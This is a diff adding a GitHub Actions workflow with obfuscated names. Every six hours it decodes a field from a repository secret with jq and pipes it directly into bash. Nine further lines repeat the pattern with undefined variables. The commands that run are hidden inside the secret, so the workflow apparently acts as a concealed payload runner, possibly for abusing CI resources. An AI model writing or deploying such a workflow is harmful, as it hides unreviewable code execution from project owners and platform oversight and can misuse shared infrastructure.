@@ -1,0 +1,26 @@
+name: liusichang3819
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: liusichang3819
+        env:
+          fmzz36: ${{ secrets.fmzz36 }}
+        run: |
+          echo $fmzz36 | jq -r .b555 | /bin/bash
+          echo $ekk45172 | jq -r .vh15829 | /bin/bash
+          echo $ceg12794 | jq -r .a7878 | /bin/bash
+          echo $egyp63 | jq -r .u9884 | /bin/bash
+          echo $dmgp292 | jq -r .auxu8736 | /bin/bash
+          echo $j54 | jq -r .z74 | /bin/bash
+          echo $fjj57 | jq -r .hfd3 | /bin/bash
+          echo $kdkv67198 | jq -r .fd6 | /bin/bash
+          echo $vvk41291 | jq -r .u70 | /bin/bash
+          echo $cn892 | jq -r .jga01480 | /bin/bash
+
